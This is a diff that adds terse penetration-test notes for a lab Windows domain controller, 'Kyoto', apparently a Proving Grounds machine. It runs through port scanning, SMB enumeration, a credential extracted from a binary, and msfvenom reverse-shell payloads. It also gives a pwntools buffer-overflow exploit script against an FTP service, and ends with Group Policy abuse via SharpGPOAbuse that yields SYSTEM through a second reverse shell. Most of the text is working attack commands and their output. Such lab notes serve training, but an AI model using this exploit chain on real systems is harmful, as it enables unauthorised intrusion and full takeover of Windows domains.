@@ -1,0 +1,161 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.183.31 > Kyoto.txt
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp
+| fingerprint-strings: 
+|   GenericLines, Help, NULL, SSLSessionReq: 
+|_    220 Welcome to Simple FTP Server NG
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-26 10:17:36Z)
+111/tcp   open  rpcbind       2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: Kyotosoft.com, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+2049/tcp  open  nlockmgr      1-4 (RPC #100021)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: Kyotosoft.com, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: KYOTOSOFT
+|   NetBIOS_Domain_Name: KYOTOSOFT
+|   NetBIOS_Computer_Name: KYOTO
+|   DNS_Domain_Name: Kyotosoft.com
+|   DNS_Computer_Name: kyoto.Kyotosoft.com
+|   DNS_Tree_Name: Kyotosoft.com
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-06-26T10:18:30+00:00
+| ssl-cert: Subject: commonName=kyoto.Kyotosoft.com
+| Issuer: commonName=kyoto.Kyotosoft.com
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-06-25T10:15:42
+| Not valid after:  2026-12-25T10:15:42
+| MD5:     f85d e41c 2ff1 cebd 637a 9f0e e1ed 8dda
+| SHA-1:   84bf 37da 37c1 22d1 9a8e 8af3 f40e f03e f41a da1b
+|_SHA-256: 6b2b 60e4 3f22 60e3 8e01 c767 a90a acb9 e1df 238b 9093 51bf 7cb2 f9ad 1d42 fa17
+|_ssl-date: 2026-06-26T10:18:42+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         Microsoft Windows RPC
+49694/tcp open  msrpc         Microsoft Windows RPC
+49704/tcp open  msrpc         Microsoft Windows RPC
+49709/tcp open  msrpc         Microsoft Windows RPC
+49734/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Hosts: Simple, KYOTO; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-06-26T10:18:33
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+$ enum4linux -a 192.168.183.31
+Domain Name: KYOTOSOFT                                                                      
+Domain Sid: S-1-5-21-3637919013-4137434400-910849308
+
+$ smbclient -L //192.168.183.31/ -N
+dev             Disk      development & debugging share
+ftp.exe
+DEVLOG.txt
+.git
+
+$ strings ftp.exe
+admin:SafariDozeDust17
+
+https://medium.com/@0xrave/kyoto-proving-grounds-practice-walkthrough-active-directory-820dfcff5ddd
+$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.45.162 LPORT=443 -f python -v sc
+
+# ftp.exe found buffer overflow vulnerability
+# ftpbov.py
+#!/usr/bin/python3
+from pwn import *
+
+sc =  b""
+sc += ... from above msfvenom
+
+buf = b""
+buf += b"A"*270
+buf += p32(0x004016be)
+buf += sc
+
+p = remote('$TargetIP', 21, level='debug') #Change $TargetIP to your target IP
+p.recvuntil(b"220")
+p.sendline(b"USER Banana")
+p.recvuntil(b"331")
+p.sendline(b"PASS "+buf)
+p.recvuntil(b"430")
+p.interactive()
+
+$ python3 kyotoftp.py
+
+$ rlwrap nc -nlvp 443      
+listening on [any] 443 ...
+connect to [192.168.45.162] from (UNKNOWN) [192.168.153.31] 49788
+Microsoft Windows [Version 10.0.20348.1906]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+kyotosoft\support
+
+C:\Windows\system32>whoami /groups
+KYOTOSOFT\Group Policy Creator Owners            Group            S-1-5-21-3637919013-4137434400-910849308-520  Group used for deny only                                       
+KYOTOSOFT\GPO Admins                             Group            S-1-5-21-3637919013-4137434400-910849308-1603 Mandatory group, Enabled by default, Enabled group             
+Authentication authority asserted identity       Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group             
+KYOTOSOFT\Denied RODC Password Replication Group Alias            S-1-5-21-3637919013-4137434400-910849308-572  Mandatory group, Enabled by default, Enabled group, Local Group
+
+
+# upload SharpGPOAbuse.exe
+# upload $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.162 LPORT=4444 -f exe -o sh4444.exe
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "Administrator" --Command "cmd.exe" --Arguments "/c c:\temp\sh4444.exe" --GPOName "Default Domain Policy"
+
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.162] from (UNKNOWN) [192.168.153.31] 64405
+Microsoft Windows [Version 10.0.20348.1906]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+
